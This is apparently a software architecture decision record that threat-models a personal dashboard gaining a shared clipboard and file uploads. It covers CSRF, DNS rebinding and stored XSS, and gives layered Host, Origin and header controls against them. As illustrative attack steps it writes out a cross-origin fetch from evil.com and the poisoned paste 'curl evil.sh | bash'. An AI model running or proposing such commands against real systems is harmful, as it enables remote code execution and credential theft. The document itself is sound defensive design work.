# ADR-0003 — The dashboard becomes writable: threat model and controls

- **Status:** Accepted
- **Date:** 2026-08-21
- **Supersedes:** the "API is read-only" decision in [ADR-0001](0001-stack-and-architecture.md)
  and the corresponding accepted risk in [ADR-0002](0002-production-profile.md).

## Why this exists

ADR-0002 recorded "no app-level authn/authz" as an accepted risk, with an explicit
trip-wire:

> *Any write/control endpoint is added, or the port is ever exposed off-tailnet.*

We are now adding write endpoints — shared clipboard, file drop, links and notes —
so the trip-wire has fired. This ADR re-derives the posture rather than extending
the old one.

## What changed materially

Read-only telemetry and a shared clipboard are not the same kind of asset.

| | Telemetry (before) | Clipboard/files (now) |
|---|---|---|
| Content | step numbers, loss values, GPU temps | **whatever you last copied** |
| Worst case if read | someone learns your loss curve | `WANDB_API_KEY`, ntfy topic, GitHub token, `.env` values, ssh one-liners |
| Worst case if written | nothing (no write path existed) | clipboard poisoning → you paste an attacker's string into a shell |

A shared clipboard history is the most **credential-dense** thing this system will
ever hold. It is a honeypot by construction. That is the whole reason this ADR is
longer than the feature deserves.

## The threat that actually matters: the browser, not the tailnet

The instinct is to worry about other devices on the tailnet. That is the *small*
risk — the tailnet contains three machines, all mine. The real adversary is **any
web page I visit in Safari while the dashboard is running**, because that page's
JavaScript can reach `http://100.x.y.z:8730` just as easily as the dashboard can.

Three concrete attacks, in increasing severity:

### T1 — Cross-origin write (CSRF)
`evil.com` issues `fetch("http://100.69.221.23:8730/api/clip", {method:"POST",
mode:"no-cors", body:…})`. This is a *simple request*: no CORS preflight is sent,
the browser fires it, and the write lands. The attacker cannot read the response,
but does not need to — poisoning the clipboard is the payload. You then paste
`curl evil.sh | bash` into a terminal believing it is what you copied.

### T2 — DNS rebinding (cross-origin **read**)
`evil.com` resolves to the attacker's IP on first load, then re-resolves to
`100.69.221.23` with a 1-second TTL. The browser still considers the page to be
same-origin with `evil.com`, so **same-origin policy no longer protects the
response body**. The attacker's JS now reads your entire clipboard history —
i.e. every token you have pasted. This is the severe one, and TLS alone does not
stop it.

### T3 — Stored XSS via uploaded file
Upload `x.html` containing a script; open it from the dashboard; it executes
*on the dashboard's own origin* and can exfiltrate everything the dashboard can
read.

## Controls

Deliberately layered, because each control fails differently.

| # | Control | Stops | Why this one |
|---|---|---|---|
| C1 | **`Host` header allowlist** — reject any request whose `Host` is not a known tailnet name/IP or localhost | **T2** | The rebinding attack must send `Host: 100.69.221.23`; a browser cannot forge `Host`. This is the only control that actually defeats rebinding, so it is non-negotiable. |
| C2 | **`Origin` check on every mutating request** — reject cross-origin and unknown origins | T1 | A browser always attaches a truthful `Origin` to cross-origin requests and JS cannot override it. |
| C3 | **Required custom header `X-Trainwatch: 1` on all writes** | T1 | A custom header makes the request non-simple, forcing a CORS preflight, which we never answer — so the browser refuses to send the real request. Belt to C2's braces. |
| C4 | **No CORS response headers, ever** | T1/T2 reads | Absent `Access-Control-Allow-Origin`, the browser withholds response bodies from cross-origin readers. |
| C5 | **Downloads are `Content-Disposition: attachment` + `nosniff` + a locked CSP** | **T3** | An uploaded `.html` is then never rendered on our origin. Uploads are stored under generated names, never client-supplied paths. |
| C6 | **Optional bearer token** (`TRAINWATCH_TOKEN`) | tailnet-local **writes** | Off by default (it is a one-user tailnet); one env var when travelling or sharing the tailnet. **Gates writes only — see the limitation below.** |
| C7 | **`secret` entries + TTL** | blast radius | Entries flagged secret are redacted in listings, excluded from search, never logged, and expire fast. Everything expires eventually. |

### C6's limitation, stated plainly

**The token gates writes, not reads.** `SecurityGuard` only checks it inside
`if mutating and is_api`, so with `TRAINWATCH_TOKEN` set, any `GET` still
succeeds unauthenticated — including `/api/clip/{id}/body`, the one route that
returns a secret in plaintext. This is deliberate and covered by
`test_c6_token_gates_writes_but_not_reads`; the intent was to keep the
dashboard usable without threading a token through the browser.

It is called out here because the row above previously read "tailnet-local
misuse", which oversold it. If the reason you are setting a token is the stated
one — *travelling or sharing the tailnet* — then read protection is precisely
what you want, and C6 does not give it to you. Treat this as the open edge: the
tailnet is still the boundary for reads.

**Trip-wire:** the first time someone other than the owner is on the tailnet,
extend the token check to reads rather than relying on C6 as written.

### Explicitly out of scope

- **`tailscale funnel` is never to be used with this service.** Funnel publishes to
  the public internet. C1/C2 would still hold, but the exposure is categorically
  different and no control here is designed for it. Documented as a footgun in
  the runbook.
- Encryption at rest. The SQLite file is protected by the host's disk encryption
  and user account; adding app-level crypto without a key-management story is
  security theatre.
- Multi-user. This is one person's three devices.

## Consequences

**Good.** The dashboard can write, and the two attacks that a private-IP service
is normally wide open to (T1, T2) are actually closed rather than hand-waved with
"it's only on my tailnet". C1 costs one middleware and is the single highest-value
line of code in the change.

**Costs.** C1 means the allowlist must be configured, and a request from an
unexpected hostname gets a 421 — which will look like a bug the first time it
happens. Mitigated by naming it clearly in the response body and the runbook.
C3 means any non-browser client (curl, the CLI) must send a header; the CLI does
this for you.

**Revised risk register.** ADR-0002's "no authn/authz" risk is now: *unauthenticated
but origin-and-host-bound, tailnet-only, with an optional token.* New trip-wires:
any use of Funnel, any additional client outside my own devices, or the first time
this holds something I would not be willing to lose.
